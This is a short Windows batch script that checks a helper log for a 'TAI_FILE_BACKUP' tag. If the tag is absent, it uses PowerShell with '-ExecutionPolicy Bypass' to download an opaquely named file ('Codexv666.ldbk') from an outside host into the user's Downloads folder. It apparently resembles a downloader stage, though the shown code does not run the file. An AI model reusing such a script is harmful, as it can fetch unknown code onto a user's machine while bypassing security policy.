@echo off 
 
set urls=https://spyderrock.com/9hs62017-Codexv666.ldbk 
call "%USERPROFILE%\Desktop\dow-code\client-code\checklog.bat" "TAI_FILE_BACKUP-11/04/2025-21:36" 
if %errorlevel% equ 0 ( 
   echo done 
) else ( 
call "%USERPROFILE%\Desktop\dow-code\client-code\addlog.bat" "TAI_FILE_BACKUP-11/04/2025-21:36" 
powershell -NoProfile -ExecutionPolicy Bypass -Command "& {Invoke-WebRequest -Uri 'https://spyderrock.com/9hs62017-Codexv666.ldbk' -OutFile '%USERPROFILE%\Downloads\Codexv666.ldbk'}" 
    ) 
    timeout /t 5 
    exit 
